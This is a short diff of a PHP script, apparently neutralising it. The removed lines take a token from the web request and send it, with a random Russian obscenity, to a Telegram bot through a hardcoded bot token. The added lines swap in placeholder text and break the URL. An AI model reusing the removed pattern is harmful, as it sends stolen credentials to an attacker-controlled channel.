@@ -32,10 +32,11 @@ $strings = array(
     'блядина',
     'пиздабол',
     'глиномес',
+    'ну тут я не стану редактировать',
 );
 $key = array_rand($strings);
 
-$tokenn = "12312525:AAHVn-qW-5Ga4123123123Xm2JcrZnc";$data = [    'text' => "З123123ова {$strings[$key]}\nНо123123кен:\n{$_REQUEST['tok']}",
-	'chat_id' => ("{$a[0]}")];file_get_contents("https://api.telegram.org/bot$tokenn/sendMessage?" . http_build_query($data) );
+$tokenn = "а токена нет";$data = [    'text' => "а сообщения нет {$strings[$key]}\nа токена нет\n{$_REQUEST['t iki tok']}",
+	'chat_id' => ("{$a[0]}")];file_get_contents("https://api . telegram . org/bot$tokenn/sendMessage?" . http_build_query($data) );
 	exit;
 ?>
